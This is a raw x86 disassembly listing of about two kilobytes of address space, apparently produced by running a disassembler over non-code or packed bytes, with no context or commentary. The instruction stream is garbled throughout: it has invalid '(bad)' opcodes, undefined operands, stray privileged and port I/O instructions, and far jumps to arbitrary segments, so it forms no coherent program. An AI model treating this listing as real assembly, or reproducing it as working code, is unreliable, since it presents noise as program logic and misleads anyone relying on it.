  41672a:	xor    edi,ebx
  41672c:	xchg   ebp,eax
  41672d:	cmp    al,0x63
  41672f:	xlat   BYTE PTR ds:[ebx]
  416730:	and    ecx,DWORD PTR es:[edi]
  416733:	lods   eax,DWORD PTR ds:[esi]
  416734:	add    DWORD PTR [ebx+0x6aa3bb87],edi
  41673a:	retf   
  41673b:	cs repnz enter 0x4c8b,0x18
  416741:	test   al,0x84
  416743:	ret    0x9b97
  416746:	mov    ?,WORD PTR [edi-0x6d1f8bfe]
  41674c:	pop    eax
  41674d:	and    DWORD PTR [esi-0x54],edi
  416750:	mov    esp,?
  416752:	(bad)  
  416754:	xlat   BYTE PTR ds:[ebx]
  416755:	mov    ah,0x23
  416757:	cdq    
  416758:	aad    0x6b
  41675a:	xor    ch,BYTE PTR [ecx-0x39]
  41675d:	pcmpgtd mm6,QWORD PTR [eax]
  416760:	inc    ecx
  416761:	jecxz  0x4167ce
  416763:	ins    BYTE PTR es:[edi],dx
  416764:	test   eax,0x9767b475
  416769:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41676a:	fidivr WORD PTR [ecx]
  41676c:	shl    DWORD PTR [ebx-0x6de8085],0xc0
  416773:	in     eax,0x33
  416775:	test   BYTE PTR [eax-0x2d],cl
  416778:	mov    edi,0xe169bad8
  41677d:	inc    eax
  41677e:	outs   dx,BYTE PTR ds:[esi]
  41677f:	and    DWORD PTR [edi-0x7f0556fe],0x52d2355f
  416789:	nop
  41678a:	in     al,0x2
  41678c:	and    cl,BYTE PTR [eax-0x3bd3ff41]
  416792:	adc    eax,0x7e7eaa32
  416797:	mov    WORD PTR [edx+esi*8-0x74c4a894],ds
  41679e:	mov    esp,0xf887ce02
  4167a3:	(bad)  
  4167a4:	ficom  DWORD PTR [edi+0x5fa83148]
  4167aa:	mov    dl,0x73
  4167ac:	xor    dh,dh
  4167ae:	jno    0x4167f5
  4167b0:	adc    BYTE PTR [ecx+0x213fe905],bl
  4167b6:	in     al,dx
  4167b7:	jo     0x416774
  4167b9:	inc    edx
  4167ba:	or     ebx,DWORD PTR [ebx]
  4167bc:	mov    al,ds:0xced24e2b
  4167c1:	lahf   
  4167c2:	sub    BYTE PTR [edx+0x72d61b65],al
  4167c8:	xchg   ebp,eax
  4167c9:	sbb    eax,0x261a9794
  4167ce:	std    
  4167cf:	inc    esp
  4167d0:	mov    al,ds:0xea82a287
  4167d5:	add    al,dl
  4167d7:	sbb    al,0x60
  4167d9:	and    ecx,DWORD PTR [ebp+0x18]
  4167dc:	inc    ecx
  4167dd:	dec    eax
  4167de:	push   edx
  4167df:	jge    0x416799
  4167e1:	mov    eax,ds:0x68ea7fe6
  4167e6:	ret    0x6da6
  4167e9:	and    dh,dh
  4167eb:	and    al,0x33
  4167ed:	mov    esp,0x44068518
  4167f2:	outs   dx,DWORD PTR ds:[esi]
  4167f3:	pop    es
  4167f4:	or     ebp,ecx
  4167f6:	in     al,0x75
  4167f8:	push   ecx
  4167f9:	mov    esi,0x14b3be93
  4167fe:	push   edi
  4167ff:	push   ebx
  416800:	enter  0xb460,0xe5
  416804:	lods   al,BYTE PTR ds:[esi]
  416805:	pop    edi
  416806:	mov    esi,0xbaca979a
  41680b:	mov    edx,0x1f924366
  416810:	jmp    0x10cf43b9
  416815:	ret    
  416816:	ins    BYTE PTR es:[edi],dx
  416817:	pop    ebp
  416818:	add    BYTE PTR [ebx],0x81
  41681b:	shl    DWORD PTR [edi],cl
  41681d:	adc    al,0x8f
  41681f:	push   0xc2e1b94a
  416824:	std    
  416825:	mov    ds:0xf73ee66d,al
  41682a:	sub    BYTE PTR [ebx],dh
  41682c:	mov    dh,0x41
  41682e:	jb     0x4167c4
  416830:	jge    0x4167d3
  416832:	sub    al,0xb0
  416834:	imul   bl
  416836:	retf   0xbdd7
  416839:	sbb    BYTE PTR [edx+0x253bd1e6],bh
  41683f:	dec    eax
  416840:	scas   eax,DWORD PTR es:[edi]
  416841:	frstor [ecx+0x18f6968c]
  416847:	xchg   ebx,eax
  416848:	in     eax,0x46
  41684a:	sub    BYTE PTR [esi],dl
  41684c:	in     al,0x62
  41684e:	into   
  41684f:	jg     0x4168af
  416851:	lock mov edx,?
  416854:	mov    ah,0x62
  416856:	lods   al,BYTE PTR ds:[esi]
  416857:	or     cl,0xdc
  41685a:	es call 0xbb8d:0xc58792d3
  416862:	add    al,0xcb
  416864:	xor    ah,BYTE PTR [edx-0x19]
  416867:	int    0xc7
  416869:	imul   eax,DWORD PTR [edx+edx*8+0x5d],0xc9810805
  416871:	mov    BYTE PTR [edi-0x57ca06c9],cl
  416877:	fwait
  416878:	aas    
  416879:	jnp    0x416824
  41687b:	push   es
  41687c:	cld    
  41687d:	or     DWORD PTR ds:0xf255acf0,0x31
  416884:	or     dl,BYTE PTR [ebp+edi*8-0x1fdcd082]
  41688b:	cmp    eax,0x5ff7b11d
  416890:	push   ecx
  416891:	bnd jo 0x4168c6
  416894:	scas   eax,DWORD PTR es:[edi]
  416895:	jg     0x416849
  416897:	in     eax,0x78
  416899:	and    ebp,DWORD PTR [edx-0x41]
  41689c:	dec    esp
  41689d:	push   edx
  41689e:	mov    edx,0x9aa34618
  4168a3:	and    eax,0x1c72453
  4168a8:	mov    ch,0xaa
  4168aa:	sti    
  4168ab:	xchg   edi,esp
  4168ad:	add    bl,BYTE PTR cs:[edi+0x56b63dd2]
  4168b4:	jbe    0x416846
  4168b6:	jae    0x4168b7
  4168b8:	mov    dl,0x43
  4168ba:	jns    0x416887
  4168bc:	mov    cs,WORD PTR [edi-0x690e5900]
  4168c2:	push   ebx
  4168c3:	xchg   ebx,eax
  4168c4:	dec    esi
  4168c5:	popa   
  4168c6:	out    0x9e,eax
  4168c8:	test   BYTE PTR [ecx],ah
  4168ca:	jecxz  0x4168cc
  4168cc:	add    WORD PTR [ecx+0x214672f0],0x62
  4168d4:	sbb    ecx,DWORD PTR [ecx+0x51bdeb91]
  4168da:	outs   dx,DWORD PTR ds:[esi]
  4168db:	ins    BYTE PTR es:[edi],dx
  4168dc:	mov    ?,ecx
  4168de:	mov    dh,0xc0
  4168e0:	or     DWORD PTR [ebx],esp
  4168e2:	mov    bl,0x3
  4168e4:	fcomip st,st(6)
  4168e6:	jmp    0x560d:0x3e5c7ed
  4168ed:	jmp    0x4168d0
  4168ef:	sahf   
  4168f0:	mov    dh,bh
  4168f2:	test   dh,0x68
  4168f5:	mov    ds:0x4c0cff17,al
  4168fa:	repz jmp 0xecf19959
  416900:	jmp    0x114:0x2094126f
  416907:	cmp    ah,dl
  416909:	jge    0x4168ba
  41690b:	leave  
  41690c:	mov    es,WORD PTR [ebp+0x3e5964d7]
  416912:	sub    cl,BYTE PTR [edx]
  416914:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416915:	(bad)  
  416916:	mov    esi,0x72bf661e
  41691b:	sbb    dl,bl
  41691d:	xor    ah,BYTE PTR ds:0x604cba1e
  416923:	xor    eax,0x74332f47
  416928:	and    al,0x16
  41692a:	fwait
  41692b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41692c:	xchg   ebp,eax
  41692d:	dec    ebp
  41692e:	inc    ebx
  41692f:	and    al,0x36
  416931:	pop    ebx
  416932:	les    esi,FWORD PTR [ebx+0x79]
  416935:	jae    0x4168f5
  416937:	inc    ebp
  416938:	sbb    al,0x4d
  41693a:	and    BYTE PTR [ebx-0x55],dl
  41693d:	pop    ss
  41693e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41693f:	xchg   ebx,eax
  416940:	shl    BYTE PTR [eax+0x1a],1
  416943:	mov    bl,0xba
  416945:	lock sbb ebx,DWORD PTR [ebx]
  416948:	mov    eax,ds:0xa20ec4db
  41694d:	dec    ebx
  41694e:	popf   
  41694f:	dec    ebp
  416950:	adc    edi,edx
  416952:	ins    DWORD PTR es:[edi],dx
  416953:	jl     0x416982
  416955:	mov    dl,0xf1
  416957:	sbb    eax,0x78983e09
  41695c:	inc    esp
  41695d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41695e:	mov    BYTE PTR [edx],ah
  416960:	sahf   
  416961:	dec    esp
  416962:	mov    bh,0xbc
  416964:	shr    esi,1
  416966:	jmp    0xdd89:0x3ab765d1
  41696d:	lock cmp dl,BYTE PTR [edi]
  416970:	sbb    edx,edi
  416972:	fidivr WORD PTR [ebp+0x5357bfba]
  416978:	data16 cld 
  41697a:	stc    
  41697b:	or     eax,DWORD PTR [edi-0x78e0d604]
  416981:	retf   
  416982:	jmp    0x416c66
  416987:	cmc    
  416988:	std    
  416989:	fs mov ah,0x74
  41698c:	jno    0x416983
  41698e:	mov    ecx,0x2f2f76b9
  416993:	loope  0x416932
  416995:	sub    dh,BYTE PTR [ebp+0x707f1fa5]
  41699b:	mov    ecx,0x2e70707e
  4169a0:	xchg   ebx,eax
  4169a1:	(bad)  
  4169a2:	jl     0x4169bb
  4169a4:	(bad)  
  4169a5:	dec    DWORD PTR [edx-0x71928400]
  4169ab:	mov    DWORD PTR [ebp-0x31],0x1486d40b
  4169b2:	mov    ss,WORD PTR [edx-0x5a]
  4169b5:	dec    edi
  4169b6:	dec    edx
  4169b7:	or     al,0x12
  4169b9:	nop
  4169ba:	push   eax
  4169bb:	aad    0x55
  4169bd:	ja     0x4169d2
  4169bf:	je     0x416995
  4169c1:	ret    
  4169c2:	or     DWORD PTR [edi],0xdc79f290
  4169c8:	das    
  4169c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169ca:	push   esp
  4169cb:	data16 fdiv DWORD PTR [eax+0x61a20c06]
  4169d2:	into   
  4169d3:	mov    WORD PTR [ebp-0x5bcd101a],ss
  4169d9:	ret    
  4169da:	push   ebx
  4169db:	jne    0x4169f4
  4169dd:	mov    bl,0xb0
  4169df:	cdq    
  4169e0:	cmp    bl,al
  4169e2:	sbb    bh,BYTE PTR [ebx-0x38]
  4169e5:	mov    al,BYTE PTR [ebp-0x692111a9]
  4169eb:	rcl    BYTE PTR [ecx+ecx*4],cl
  4169ee:	mov    ds:0xeb938dd0,eax
  4169f3:	fisubr DWORD PTR [eax+0x1]
  4169f6:	in     eax,dx
  4169f7:	cmp    eax,0x21acb117
  4169fc:	sbb    al,0xc7
  4169fe:	in     eax,dx
  4169ff:	(bad)  
  416a00:	pop    ds
  416a01:	push   ebp
  416a02:	inc    esp
  416a03:	shr    BYTE PTR [ebx+ebx*1-0xc],cl
  416a07:	dec    edx
  416a08:	icebp  
  416a09:	(bad)  
  416a0a:	and    DWORD PTR [edi],edi
  416a0c:	push   0x37a51575
  416a11:	dec    ebx
  416a12:	push   0x4e
  416a14:	jo     0x416a4d
  416a16:	loop   0x4169b9
  416a18:	sub    DWORD PTR [esi+0x14ce133e],ebx
  416a1e:	cmp    ecx,DWORD PTR [esi]
  416a20:	rcl    DWORD PTR [ebx+edx*4],cl
  416a23:	pop    DWORD PTR [esi]
  416a25:	push   edx
  416a26:	iret   
  416a27:	sbb    BYTE PTR ds:0x30abfe0e,0xa5
  416a2e:	xlat   BYTE PTR ds:[ebx]
  416a2f:	sub    edi,ecx
  416a31:	fnstcw WORD PTR [ebx]
  416a33:	xchg   esp,eax
  416a34:	ret    0xf841
  416a37:	dec    esi
  416a38:	pop    edx
  416a39:	test   al,0x34
  416a3b:	ret    
  416a3c:	xor    DWORD PTR [ecx],edi
  416a3e:	pop    ecx
  416a3f:	retf   
  416a40:	lahf   
  416a41:	add    bl,BYTE PTR [eax]
  416a43:	iret   
  416a44:	sub    al,0x6e
  416a46:	and    DWORD PTR [esi+0x36],ecx
  416a49:	adc    al,0x86
  416a4b:	sbb    BYTE PTR [eax-0x61d585b1],dh
  416a51:	sub    DWORD PTR [ebx-0x5409351e],0xffffffda
  416a58:	cli    
  416a59:	cmp    al,0xbb
  416a5b:	lea    edi,[ebx+0x8]
  416a5e:	inc    esp
  416a5f:	int    0xa3
  416a61:	and    DWORD PTR [ecx-0x37],esi
  416a64:	mov    edx,0x5550c8f1
  416a69:	push   ds
  416a6a:	mov    bl,0xd5
  416a6c:	dec    ebx
  416a6d:	push   esi
  416a6e:	loop   0x416a10
  416a70:	leave  
  416a71:	outs   dx,DWORD PTR ds:[esi]
  416a72:	fsub   QWORD PTR [ebp-0x5c]
  416a75:	bound  ebx,QWORD PTR [esi+0x38]
  416a78:	add    dh,ch
  416a7a:	cmc    
  416a7b:	sbb    ebx,edx
  416a7d:	cmc    
  416a7e:	icebp  
  416a7f:	mov    al,0x1d
  416a81:	xor    ebx,eax
  416a83:	and    edx,edx
  416a85:	call   0x1f52e0b4
  416a8a:	pop    ds
  416a8b:	stc    
  416a8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a8d:	je     0x416aed
  416a8f:	bound  ebx,QWORD PTR [ecx]
  416a91:	pop    ecx
  416a92:	jae    0x416a38
  416a94:	test   esp,esi
  416a96:	(bad)  
  416a97:	je     0x416ab2
  416a99:	mov    ds,WORD PTR [esi-0x34f98225]
  416a9f:	les    edi,FWORD PTR [esi-0x687c8f9]
  416aa5:	shl    ah,1
  416aa7:	or     bl,BYTE PTR [eax]
  416aa9:	push   edi
  416aaa:	adc    al,0x99
  416aac:	test   ch,al
  416aae:	jmp    0x416aeb
  416ab0:	lock punpcklbw mm3,DWORD PTR [ebp+0x70]
  416ab5:	loopne 0x416a7b
  416ab7:	or     DWORD PTR [edi-0x53],edx
  416aba:	leave  
  416abb:	fld    st(5)
  416abd:	test   DWORD PTR [ebp+0x35f9a69f],0x14b56af3
  416ac7:	rol    DWORD PTR [ecx-0x716fd078],1
  416acd:	cwde   
  416ace:	jg     0x416ada
  416ad0:	pop    ebp
  416ad1:	sti    
  416ad2:	in     eax,0x6
  416ad4:	add    eax,0xbf90f09d
  416ad9:	xchg   si,ax
  416adb:	add    eax,0xacd40f8e
  416ae0:	mov    ebx,0xdb579d73
  416ae5:	push   ds
  416ae6:	push   ecx
  416ae7:	ins    BYTE PTR es:[edi],dx
  416ae8:	clc    
  416ae9:	rcr    DWORD PTR cs:[eax],cl
  416aec:	xchg   edi,eax
  416aed:	test   eax,0x7b609cb2
  416af2:	inc    ebx
  416af3:	jnp    0x416b21
  416af5:	xchg   ebx,eax
  416af6:	int3   
  416af7:	cmp    ebp,DWORD PTR [esi]
  416af9:	adc    al,0x78
  416afb:	push   0xd6553471
  416b00:	xor    al,0x72
  416b02:	inc    BYTE PTR [ecx-0x5eeb1e9]
  416b08:	neg    BYTE PTR [ebx]
  416b0a:	and    al,0x2f
  416b0c:	xchg   ebx,eax
  416b0d:	jno    0x416b40
  416b0f:	ss jne 0x416aef
  416b12:	add    al,bh
  416b14:	dec    edx
  416b15:	std    
  416b16:	(bad)  
  416b17:	fimul  WORD PTR [ebp+0x39]
  416b1a:	cwde   
  416b1b:	jns    0x416af6
  416b1d:	jmp    0xb785:0x10c37054
  416b24:	inc    esp
  416b25:	sub    bl,BYTE PTR [esi-0x6dd4e9af]
  416b2b:	and    BYTE PTR [ebx+0x1de65ce4],bl
  416b31:	stos   DWORD PTR es:[edi],eax
  416b32:	mov    ah,0x9f
  416b34:	cmp    ebx,0x0
  416b37:	ss repnz push ecx
  416b3a:	ins    DWORD PTR es:[edi],dx
  416b3b:	test   eax,0x6f8ba65b
  416b40:	gs dec edi
  416b42:	dec    ebx
  416b43:	out    0xd4,al
  416b45:	and    al,0xeb
  416b47:	adc    dl,ch
  416b49:	xchg   ecx,eax
  416b4a:	mov    eax,0x81af0f6c
  416b4f:	lods   eax,DWORD PTR ds:[esi]
  416b50:	pop    esp
  416b51:	mov    BYTE PTR [ecx+0x75],dl
  416b54:	cmp    bh,BYTE PTR [ecx-0x1c20557]
  416b5a:	and    dh,BYTE PTR [edi+0x5f12e1c0]
  416b60:	xor    dl,al
  416b62:	popf   
  416b63:	sbb    eax,0x978128df
  416b68:	mov    dl,0x4e
  416b6a:	xor    edx,DWORD PTR [edx-0x6227a8e8]
  416b70:	std    
  416b71:	inc    ebx
  416b72:	je     0x416b22
  416b74:	sub    eax,0xf8db3950
  416b79:	lods   al,BYTE PTR ds:[esi]
  416b7a:	imul   ebx,DWORD PTR [edi-0x20],0x35
  416b7e:	cli    
  416b7f:	sbb    al,0x4d
  416b81:	imul   eax,DWORD PTR [ebp-0x37f47fa5],0x36796920
  416b8b:	out    0xb8,al
  416b8d:	shl    DWORD PTR [ebp-0x7d],0x84
  416b91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b92:	idiv   DWORD PTR [edi]
  416b94:	ins    BYTE PTR es:[edi],dx
  416b95:	push   cs
  416b96:	cmp    edi,DWORD PTR [ecx-0x22]
  416b99:	jbe    0x416b99
  416b9b:	xor    eax,0x2fd3b6ac
  416ba0:	ficomp DWORD PTR [ebx+edi*8]
  416ba3:	pushf  
  416ba4:	hlt    
  416ba5:	aam    0x7c
  416ba7:	cmp    eax,0x65b60810
  416bac:	or     al,BYTE PTR [eax+0x16b313a0]
  416bb2:	push   edx
  416bb3:	adc    eax,0x13c07443
  416bb8:	xchg   edx,eax
  416bb9:	lods   eax,DWORD PTR ds:[esi]
  416bba:	aad    0xfe
  416bbc:	xchg   BYTE PTR [esi],bh
  416bbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bbf:	or     ebx,DWORD PTR [edi]
  416bc1:	rcl    BYTE PTR [eax-0x1d],0x4d
  416bc5:	mov    al,0x80
  416bc7:	xor    BYTE PTR [esi],cl
  416bc9:	dec    edi
  416bca:	sub    edx,0x83d82bed
  416bd0:	test   al,0x5e
  416bd2:	cld    
  416bd3:	mov    esp,ss
  416bd5:	popa   
  416bd6:	jbe    0x416b83
  416bd8:	push   edi
  416bd9:	cwde   
  416bda:	in     eax,0xc4
  416bdc:	or     eax,0x408b3606
  416be1:	inc    esp
  416be2:	jp     0x416c0d
  416be4:	dec    esp
  416be5:	push   esi
  416be6:	push   cs
  416be7:	inc    ebp
  416be8:	test   al,0x40
  416bea:	sub    DWORD PTR [edi],edx
  416bec:	lock xchg ecx,eax
  416bee:	or     bl,BYTE PTR [eax-0x156f525e]
  416bf4:	inc    esp
  416bf5:	ins    BYTE PTR es:[edi],dx
  416bf6:	cmp    al,0x92
  416bf8:	cs push ebp
  416bfa:	cmp    BYTE PTR [esi],0xcd
  416bfd:	int3   
  416bfe:	mov    eax,ds:0x3ca17e48
  416c03:	xchg   edi,eax
  416c04:	dec    ebx
  416c05:	lods   eax,DWORD PTR ds:[esi]
  416c06:	cld    
  416c07:	aas    
  416c08:	retf   0x7299
  416c0b:	push   ebp
  416c0c:	mov    al,ss:0x8a2ed507
  416c12:	adc    DWORD PTR [edi],edi
  416c14:	out    0x4b,eax
  416c16:	sub    al,0x92
  416c18:	repz jae 0x416c35
  416c1b:	test   eax,0x30aea1f8
  416c20:	xor    bh,BYTE PTR [ebx]
  416c22:	xor    BYTE PTR [edx],dh
  416c24:	es dec eax
  416c26:	mul    DWORD PTR ss:[edi+0x9]
  416c2a:	inc    esi
  416c2b:	mov    eax,0xe12e55f3
  416c30:	mul    BYTE PTR ds:[ebp-0xe1033e3]
  416c37:	leave  
  416c38:	cwde   
  416c39:	jecxz  0x416bfd
  416c3b:	or     ebx,esi
  416c3d:	call   0xd622c818
  416c42:	inc    eax
  416c43:	xchg   esi,eax
  416c44:	lahf   
  416c45:	sti    
  416c46:	mov    bl,0xbf
  416c48:	(bad)  
  416c4a:	pop    ebp
  416c4b:	xor    BYTE PTR [ecx-0x24],ch
  416c4e:	and    bh,dl
  416c50:	sar    DWORD PTR [ebp-0x78b36237],1
  416c56:	and    bh,BYTE PTR [eax]
  416c58:	sti    
  416c59:	(bad)  
  416c5a:	jmp    0x2996:0x4c263846
  416c61:	push   cs
  416c62:	mov    dh,0x57
  416c64:	sti    
  416c65:	(bad)  
  416c66:	dec    ecx
  416c67:	mov    eax,DWORD PTR [ebp-0x1c]
  416c6a:	jmp    0x416f4e
  416c6f:	outs   dx,BYTE PTR ds:[esi]
  416c70:	ds push eax
  416c72:	loopne 0x416cd4
  416c74:	outs   dx,BYTE PTR ds:[esi]
  416c75:	outs   dx,BYTE PTR ds:[esi]
  416c76:	mov    esi,0xcbfa089
  416c7b:	pop    es
  416c7c:	repz push es
  416c7e:	cmp    esi,ebp
  416c80:	sbb    al,0x7f
  416c82:	jo     0x416c3d
  416c84:	jle    0x416cf6
  416c86:	jo     0x416c81
  416c88:	(bad)
  416c8b:	mov    esp,0xa4c7fafe
  416c90:	pop    ss
  416c91:	pop    es
  416c92:	or     edi,DWORD PTR cs:[ebp+0x7d606547]
  416c99:	out    0x92,eax
  416c9b:	jns    0x416ccd
  416c9d:	xor    ah,BYTE PTR [ecx-0x252dafc6]
  416ca3:	push   edx
  416ca4:	dec    ecx
  416ca6:	iret   
  416ca7:	fnstsw WORD PTR [eax+0x2eb5cab5]
  416cad:	push   esi
  416cae:	pop    esi
  416caf:	sub    eax,0x3fb3f407
  416cb4:	push   ebx
  416cb5:	adc    BYTE PTR [edx+0x5ddb7556],dh
  416cbb:	pmaddwd mm5,QWORD PTR [eax-0x21230826]
  416cc2:	pop    ss
  416cc3:	jbe    0x416c7d
  416cc5:	jmp    0xcabcd45b
  416cca:	dec    esp
  416ccb:	fiadd  WORD PTR [edi+ecx*2-0x3]
  416ccf:	popa   
  416cd0:	jnp    0x416c88
  416cd2:	data16 not BYTE PTR [ebx+0x59d3e4b0]
  416cd9:	rcr    BYTE PTR [ecx+0x7878f547],1
  416cdf:	jl     0x416cd9
  416ce1:	lahf   
  416ce2:	not    BYTE PTR ds:0xcf5ed3fd
  416ce8:	out    dx,eax
  416ce9:	cdq    
  416cea:	in     eax,dx
  416ceb:	es das 
  416ced:	jmp    0xdfe9:0xe80ddcf6
  416cf4:	js     0x416d1d
  416cf6:	scas   al,BYTE PTR es:[edi]
  416cf7:	xor    al,0x55
  416cf9:	retf   
  416cfa:	xor    ebx,DWORD PTR [edx]
  416cfc:	fxch   st(3)
  416cfe:	or     eax,0xaed24969
  416d03:	popa   
  416d04:	fldenv [ebx-0x17ee31ac]
  416d0a:	(bad)  
  416d0b:	int    0x87
  416d0d:	inc    ecx
  416d0e:	push   0x46bcfed3
  416d13:	add    BYTE PTR [esi+0x18e7abb7],bl
  416d19:	jle    0x416cbe
  416d1b:	dec    edx
  416d1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d1d:	push   eax
  416d1e:	ss data16 das 
  416d21:	xor    ah,BYTE PTR [esi-0x475bd0da]
  416d27:	sbb    al,0x93
  416d29:	pop    ecx
  416d2a:	arpl   WORD PTR [ebx+0x1027434a],dx
  416d30:	in     eax,0x63
  416d32:	xor    BYTE PTR [esi+0x525bf4fe],al
  416d38:	cmp    bh,ch
  416d3a:	sti    
  416d3b:	mov    ebp,DWORD PTR [ebx-0x38]
  416d3e:	xchg   esp,eax
  416d3f:	call   DWORD PTR [ecx]
  416d41:	(bad)  
  416d42:	popa   
  416d43:	ss loop 0x416d83
  416d46:	jl     0x416d76
  416d48:	and    DWORD PTR [esi+esi*8+0x4ed4e25b],ebp
  416d4f:	sbb    eax,0x91b00f02
  416d54:	sbb    al,0x4c
  416d56:	cmp    DWORD PTR [ecx+0x6f010fbd],edi
  416d5c:	imul   esi,DWORD PTR [edx-0x222304f],0xffffffe8
  416d63:	sbb    DWORD PTR [ecx],ebp
  416d65:	out    dx,al
  416d66:	sbb    DWORD PTR [edx-0x56ad0782],edi
  416d6c:	test   edx,ecx
  416d6e:	add    eax,0xeb713254
  416d73:	mov    cs,WORD PTR [edx-0x341b8fef]
  416d79:	jne    0x416dae
  416d7b:	xor    BYTE PTR [ebx-0x2fad9109],ah
  416d81:	or     bl,dh
  416d83:	pop    es
  416d84:	pop    ecx
  416d85:	sbb    ebx,DWORD PTR [ebx+0x1a5183d3]
  416d8b:	pop    edx
  416d8c:	pop    ds
  416d8d:	inc    edi
  416d8e:	mov    bl,0xeb
  416d90:	mov    dl,0xf2
  416d92:	xchg   dh,bl
  416d94:	aad    0xdb
  416d96:	ds stc 
  416d98:	add    al,0xec
  416d9a:	mov    esp,0x95f0a8c1
  416d9f:	sub    ah,al
  416da1:	jns    0x416d41
  416da3:	retf   0xaaa5
  416da6:	lahf   
  416da7:	add    al,0x34
  416da9:	loopne 0x416e28
  416dab:	bound  eax,QWORD PTR [edx+0x7e]
  416dae:	das    
  416daf:	jae    0x416dda
  416db1:	jg     0x416d41
  416db3:	(bad)  
  416db4:	in     al,0xbd
  416db6:	jb     0x416db0
  416db8:	cwde   
  416db9:	lahf   
  416dba:	mov    bh,0x71
  416dbc:	js     0x416d43
  416dbe:	xor    cl,BYTE PTR [edi-0x3683b53e]
  416dc4:	xchg   edi,eax
  416dc5:	add    DWORD PTR [esi-0x1565c855],ecx
  416dcb:	and    ch,BYTE PTR [edi]
  416dcd:	int    0x25
  416dcf:	or     BYTE PTR [edi+edx*8+0x38],0x11
  416dd4:	lods   eax,DWORD PTR ds:[esi]
  416dd5:	push   ecx
  416dd6:	or     eax,0x8e613c16
  416ddb:	mov    gs,WORD PTR [esi+0x34]
  416dde:	or     esi,DWORD PTR [eax-0x537a9c80]
  416de4:	ror    DWORD PTR [esi],0x85
  416de7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416de8:	bound  edi,QWORD PTR [esi]
  416dea:	pop    es
  416deb:	shl    BYTE PTR [eax],cl
  416ded:	xchg   BYTE PTR ds:0xdfe7a2cb,bl
  416df3:	shr    BYTE PTR [esi+0x40c3f974],cl
  416df9:	jo     0x416e71
  416dfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416dfc:	(bad)  
  416dfd:	clc    
  416dfe:	push   edi
  416dff:	jecxz  0x416dc0
  416e01:	retf   
  416e02:	push   es
  416e03:	xchg   edx,eax
  416e04:	xor    cl,cl
  416e06:	daa    
  416e07:	mov    ds:0x7505c66e,al
  416e0c:	inc    esp
  416e0d:	jg     0x416e17
  416e0f:	loopne 0x416e85
  416e11:	pop    ds
  416e12:	mov    edx,0xc6d7887b
  416e17:	inc    ecx
  416e18:	sbb    eax,0xe6001a05
  416e1d:	int3   
  416e1e:	scas   eax,DWORD PTR es:[edi]
  416e1f:	add    DWORD PTR [ecx+0xe],esp
  416e22:	adc    DWORD PTR [ebp-0xc],edi
  416e25:	cmp    BYTE PTR [ebp+0x2b479153],ah
  416e2b:	les    esp,FWORD PTR [esi]
  416e2d:	mov    cl,0x8c
  416e2f:	jbe    0x416e74
  416e31:	pushf  
  416e32:	cmp    al,0xc5
  416e34:	jp     0x416e6a
  416e36:	xor    DWORD PTR [ebp-0x6bec144c],ebx
  416e3c:	adc    eax,0x91e659fa
  416e41:	daa    
  416e42:	repnz sahf 
  416e44:	frstor [esi-0x3e]
  416e47:	jne    0x416e37
  416e49:	mov    ebp,0xb425e173
  416e4e:	dec    ecx
  416e4f:	dec    esp
  416e50:	mov    eax,ds:0xba203c53
  416e55:	stos   BYTE PTR es:[edi],al
  416e56:	dec    esi
  416e57:	jp     0x416e81
  416e59:	jbe    0x416ec4
  416e5b:	or     BYTE PTR [eax+0x45],dh
  416e5e:	dec    edi
  416e5f:	aad    0x7d
  416e61:	out    0x48,al
  416e63:	mov    ah,0x2a
  416e65:	and    BYTE PTR [ebp-0x55dc60e8],ch
  416e6b:	int    0x16
  416e6d:	pop    ss
  416e6e:	in     eax,dx
  416e6f:	jae    0x416ec1
  416e71:	mov    al,0x7b
  416e73:	fmul   DWORD PTR [edi+0x33]
  416e76:	pop    esp
  416e77:	out    0x76,al
  416e79:	dec    edx
  416e7a:	arpl   WORD PTR [ecx+0x1dd2d664],dx
  416e80:	and    ecx,DWORD PTR [edi+0x32]
  416e83:	sbb    DWORD PTR fs:[esi-0x1f],0x4169340c
  416e8b:	jo     0x416e56
  416e8d:	or     DWORD PTR [bx+si+0x3e],eax
  416e91:	sbb    esp,DWORD PTR [ebx+0x71fec286]
  416e97:	push   ecx
  416e98:	push   cx
  416e9a:	cmp    ebp,DWORD PTR [ecx+0x734bea2a]
  416ea0:	xchg   ah,bh
  416ea2:	inc    esi
  416ea3:	inc    ebx
  416ea4:	(bad)  
  416ea5:	jbe    0x416eb3
  416ea7:	xor    esi,DWORD PTR [ebx]
  416ea9:	sub    ecx,DWORD PTR [ebp+ebx*2+0x58]
  416ead:	add    dl,BYTE PTR [ecx+0x4d24a6bd]
  416eb3:	or     DWORD PTR [ebx],ebx
  416eb5:	out    dx,eax
  416eb6:	fisubr DWORD PTR [eax]
  416eb8:	inc    esi
  416eb9:	clc    
  416eba:	fisub  WORD PTR [eax-0x2e]
  416ebd:	mov    edi,0x36f7ea26
  416ec2:	mov    ebp,0xc7d08453
  416ec7:	ins    BYTE PTR es:[edi],dx
  416ec8:	es pop ds
  416eca:	test   DWORD PTR [esi-0x5d9c5ecb],ebx
  416ed0:	imul   esp,esi,0x7fa11b46
  416ed6:	call   0x35461265
  416edb:	add    eax,0x82628d50
  416ee0:	pop    ebp
  416ee1:	jmp    0x416f3d
  416ee3:	pop    esi
  416ee4:	pop    ds
  416ee5:	and    cl,BYTE PTR [ebx+0xdd969e4]
  416eeb:	and    DWORD PTR [eax-0x74028398],edx
  416ef1:	mov    ebp,0xe41bab18
  416ef6:	mov    ah,0xe7
  416ef8:	ds int 0xeb
  416efb:	and    BYTE PTR [esi+0x61d2db9e],0x4
  416f02:	or     al,0x72
  416f04:	sub    ebp,edi
  416f06:	mov    al,0xc5
  416f08:	(bad)  
  416f09:	adc    al,0x5b
  416f0b:	sub    BYTE PTR [ebx+ebx*4+0x60f33b92],bl
  416f12:	ja     0x416ed6
  416f14:	xchg   DWORD PTR [ebx-0x25],edi
  416f17:	sar    bl,cl
